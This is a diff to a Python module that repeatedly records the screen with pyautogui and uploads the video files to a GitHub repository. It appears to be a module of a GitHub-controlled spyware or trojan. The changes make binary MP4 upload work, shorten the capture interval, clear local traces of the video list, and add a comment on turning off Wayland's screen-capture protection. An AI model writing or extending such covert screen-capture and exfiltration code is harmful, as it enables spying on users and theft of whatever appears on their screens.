@@ -6,12 +6,16 @@ from PIL import Image
 import pyautogui
 import random
 import socket 
+import threading
 
 from datetime import datetime
 from time import sleep
 
 #? Will work for other OSs besides Windows without additional 
 #? packages being installed, but Windows will work stand alone
+#! You may have to disable Wayland as the display server, it does 
+#! not let you screen grab the screen for security reasons
+#! sudo nano /etc/gdm3/custom.conf, disable Wayland
 
 #* pip install pyautogui
 #* https://pyautogui.readthedocs.io/en/latest/
@@ -142,15 +146,16 @@ class GithubUpload:
         self.repo = github_connect()   
         
 
-    def store_result(self, data):
-        message = datetime.now().isoformat()
-        remote_path = f'{REP_KEY_PTH}/{message}.mp4'
+    def store_result(self, data, filename):
+        # file_name = datetime.now().isoformat()
+        remote_path = f'{REP_KEY_PTH}/{filename}'
         #! Changed this line to store an mp4 file
-        bindata = bytes('%r' % data, 'utf-8')
+        bindata = bytes(data)
 
 
         try:
-            self.repo.create_file(remote_path, message, bindata)
+            self.repo.create_file(remote_path, filename, bindata)
+            print(f'File: {filename} created')
             #? Human readable above
             # self.repo.create_file(remote_path, message, base64.b64encode(bindata))
             #? This is the remote_path in the GitHub repo not on the local machine
@@ -162,14 +167,22 @@ class GithubUpload:
 
 def run(**args):
     sc = ScreenCapture()
-    sc.getScreen()
+    # sc.getScreen()
+
+    # thread = threading.Thread(target=sc.getScreen())
+    # thread.start()
 
     gu = GithubUpload()
 
     while True:
+        # thread = threading.Thread(target=sc.getScreen())
+        # thread.start()
+
+        sc.getScreen()
+
         rand = random.randrange(5,15)
         # sleep(60*rand)
-        sleep(30)
+        sleep(15)
 
         videos = sc.getVideoList()
 
@@ -177,11 +190,20 @@ def run(**args):
             # print(f'Video Path: {video_path}')
             with open(video_path, 'rb') as file:
 
+                filename = video_path.split('/')
+                # print(f'Filename: {filename[2]}')
+                filename =  filename[2]
+
                 try:
                     conent = file.read()
-                    gu.store_result(conent) 
+                    gu.store_result(conent, filename) 
                 except Exception as e:
                     print(f'Exception: {e}')
+
+
+        sc.clearVideoList()
+
+        # thread.join()
 
 
 if __name__ == '__main__':
